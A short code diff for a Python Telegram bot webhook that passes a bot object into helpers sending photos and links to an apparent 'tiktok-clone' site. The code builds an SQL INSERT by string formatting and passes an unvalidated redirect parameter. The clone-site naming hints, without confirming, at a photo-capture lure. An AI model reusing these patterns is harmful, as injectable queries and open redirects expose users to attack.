@@ -83,7 +83,7 @@ async def webhook(
         if subscription > 0:
 
         
-            await send_telegram_photo(user_id, photo, redirect_url)
+            await send_telegram_photo(user_id, photo, redirect_url, bot)
             await (await bot.get_session()).close()
                  
         else:
@@ -100,7 +100,7 @@ async def webhook(
 
 
 
-            message = await send_telegram_message(user_id=user_id, text=f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard)
+            message = await send_telegram_message(user_id=user_id, text=f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard, bot=bot)
 
          
             mycursor.execute("INSERT INTO kwork22_photo (url, photo_time, user_id, message_id, token)  VALUES ('{}', '{}', '{}', '{}', '{}')".format(photo_path, int(time.time()), int(user_id), str(message_list), str(token_kist) ))
@@ -112,12 +112,12 @@ async def webhook(
     return {"status": "Success"}
 
 
-async def send_telegram_message(user_id, text, reply_markup):
+async def send_telegram_message(user_id, text, reply_markup, bot):
     message = await bot.send_message(user_id, text, reply_markup=reply_markup, disable_web_page_preview=True)
     return message
 
 
-async def send_telegram_photo(user_id, photo, redirect_url):
+async def send_telegram_photo(user_id, photo, redirect_url, bot):
     photo_path = await save_image(photo, "data/images")
     message = await bot.send_photo(user_id, FSInputFile(photo_path), caption=f'🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}')
         
